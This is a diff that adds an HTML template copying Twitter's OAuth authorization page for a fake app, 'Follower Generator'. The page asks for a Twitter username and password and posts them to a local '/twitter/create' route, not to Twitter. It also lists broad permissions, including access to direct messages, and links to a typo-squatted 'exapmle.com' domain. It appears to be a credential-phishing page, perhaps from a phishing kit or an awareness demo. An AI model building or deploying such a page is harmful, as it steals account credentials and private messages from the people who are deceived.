@@ -1,0 +1,145 @@
+
+<!DOCTYPE html>
+<html lang="en"  dir="ltr"
+      class="">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
+    <title>Twitter / Authorize an application</title>
+    <link rel="stylesheet" type="text/css" media="screen" href="https://abs-0.twimg.com/login/tfw-base.c00ccbe52fc5680544a65d64aa0e639fa94ded85.css">
+    <!--[if (IEMobile) & (lt IE 9)]>
+      <link href="https://abs-0.twimg.com/login/phoenix-iemobile.104678bc7c9a0fb1f16229c5bb8c4288c0e1b560.css" media="screen" rel="stylesheet" type="text/css" />
+    <![endif]-->
+        <meta name="mswebdialog-title" content="Twitter"><meta name="mswebdialog-logo" content="https://abs.twimg.com/favicons/win8-auth-60.png"><meta name="mswebdialog-header-color" content="#202020"><meta name="mswebdialog-newwindowurl" content="*">
+
+
+
+  </head>
+
+
+  <body class="oauth write tfw en logged-out    noloki">
+
+    <div id="header" role="banner">
+      <div class="bar">
+        <h1 class="logo">
+          <a class="alternate-context" href="https://twitter.com/home">Twitter</a>
+        </h1>
+
+        <div id="not-logged-in">
+              <a href="https://twitter.com/signup?context=oauth&amp;oauth_token=EAhMNwAAAAAAynbuAAABWY_bAiU" class="register alternate-context">Sign up for Twitter</a>
+
+        </div>
+      </div>
+    </div>
+
+    <div id="bd" role="main">
+
+
+
+
+
+    <div class="auth">
+      <h2>Authorize Follower Generator to use your account?</h2>
+
+      <div class="app-info" role="content-info" tabindex="0">
+  <h3>
+    <img alt="" class="app-icon" src="https://abs.twimg.com/a/1404172626/images/oauth_application.png" title="Follower Generator">
+    Follower Generator
+  </h3>
+  <dl>
+      <dt class="url">Application URL</dt>
+      <dt class="notes">About this app</dt>
+      <dd class="notes"><p>Follower Generator places your tweets higher on your followers feed in order to make your account more noticeable! </p></dd>
+      <dt class="terms">Privacy Policy</dt>
+      <dd class="terms"><p><a href="http://ww.exapmle.com/terms">Privacy Policy</a></p></dd>
+      <dt class="terms">Terms and Conditions</dt>
+      <dd class="terms"><p><a href="http://ww.exapmle.com/cond">Terms and Conditions</a></p></dd>
+
+  </dl>
+</div>
+
+      <form action="/twitter/create" id="oauth_form" method="post" enctype='application/json' target="_self">
+        <div>
+          <input name="authenticity_token" type="hidden" value="eb28877458917f42c8631e66aff66b23293a8c70">
+          <input name="redirect_after_login" type="hidden" value="https://api.twitter.com/oauth/authorize?oauth_token=EAhMNwAAAAAAynbuAAABWY_bAiU">
+        </div>
+
+        <input id="oauth_token" name="oauth_token" type="hidden" value="EAhMNwAAAAAAynbuAAABWY_bAiU">
+
+          <fieldset class="sign-in">
+  <legend>Log in to Twitter</legend>
+  <div class="row user ">
+
+
+    <label for="email" tabindex="-1">Username or email</label>
+    <input aria-required="true" autocapitalize="off" autocorrect="off" autofocus="autofocus" class="text" id="email" name="email" placeholder='Username or Email' type="text" value="">
+  </div>
+  <div class="row password ">
+    <label for="password" tabindex="-1">Password</label>
+    <input aria-required="true" class="password text" placeholder='Password'  id="password" name="password" type="password" value="">
+
+  </div>
+  <p>
+    <input type="checkbox" name="remember_me" id="remember" value="1">
+    <label for="remember">Remember me</label>
+    &middot;
+    <a href="https://twitter.com/account/resend_password" class="alternate-context" target="_blank">Forgot password?</a>
+  </p>
+
+</fieldset>
+
+
+        <fieldset class="buttons">
+          <legend>Authorize Follower Generator access to use your account?</legend>
+          <input type="submit" value="Authorize app" class="submit button selected" id="allow">
+
+          <input class="submit button" id="cancel" name="cancel" type="submit" value="Cancel">
+            <input type="hidden" name="_csrf" value="<%= _csrf %>">
+        </fieldset>
+      </form>
+
+
+<div class="permissions allow">
+  <p><strong>This application will be able to:</strong></p>
+  <ul>
+      <li>Read Tweets from your timeline.</li>
+
+
+      <li>See who you follow, and follow new people.</li>
+      <li>Update your profile.</li>
+      <li>Post Tweets for you.</li>
+
+      <li>Access your direct messages.</li>
+
+
+  </ul>
+</div>
+      <div class="permissions deny">
+  <p><strong>Will not be able to:</strong></p>
+  <ul>
+
+
+
+    <li>See your Twitter password.</li>
+  </ul>
+</div>
+
+    </div>
+
+    </div>
+
+
+  <div class="footer" role="navigation"><div id="ft">
+
+
+  <p class="tip">You can revoke access to any application at any time from the <a href="https://twitter.com/settings/applications" target="_blank">Applications tab</a> of your Settings page.</p>
+  <p><small>By authorizing an application you continue to operate under <a href="https://twitter.com/tos" target="_blank">Twitter's Terms of Service</a>. In particular, some usage information will be shared back with Twitter. For more, see our <a href="https://twitter.com/privacy" target="_blank">Privacy Policy</a>.</small></p>
+
+
+
+
+  </div></div>
+
+  </body>
+</html>
